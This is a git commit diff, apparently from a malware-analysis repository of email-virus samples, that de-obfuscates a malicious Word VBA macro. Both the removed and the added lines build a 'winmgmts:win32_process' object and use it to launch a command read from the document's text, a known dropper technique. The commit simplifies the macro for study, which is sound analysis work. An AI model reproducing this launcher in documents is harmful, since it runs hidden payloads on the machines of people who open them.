217129fc6af39c7712b943d5e6a48e10a48acb2a
EdoardoGiussani <edoardo.giussani@outlook.com>
2020-12-31 11:33:29 +0100

    Simplification of the macro

--- email_viruses/15140-30-122020-5-42286/Macros/Macro_3.vb
+++ email_viruses/15140-30-122020-5-42286/Macros/Macro_3.vb
@@ -3,16 +3,16 @@ Attribute VB_Name = "Zm6erye0ms_u"
 
 Function FUNC_1()
     On Error Resume Next
-    VAR_1 = T77vhvocooru69svd.StoryRanges.Item(4 / 4)
+    VAR_1 = Macro_2.StoryRanges.Item(1)
     
-    STRING_5 = "" + Mid(Application.Name, 6, 1) + ""
+    STRING_5 = Mid(Application.Name, 6, 1)
     
     STRING_6 = "winmgmt" + STRING_5 + ":win32_process"
        
-    Set Pk_5ig5b_s73znxc0 = CreateObject(STRING_6)
+    Set obj_winmgmt = CreateObject(STRING_6)
     
-    STRING_8 = Mid(VAR_1, (15 / 3), Len(VAR_1))
+    STRING_8 = Mid(VAR_1, 5, Len(VAR_1))
     
-    Pk_5ig5b_s73znxc0.Create FUNC_2(STRING_8), Voimejxb5291hk, Q3bxn77g1219
+    obj_winmgmt.Create STRING_8, Voimejxb5291hk, Q3bxn77g1219
     
 End Function
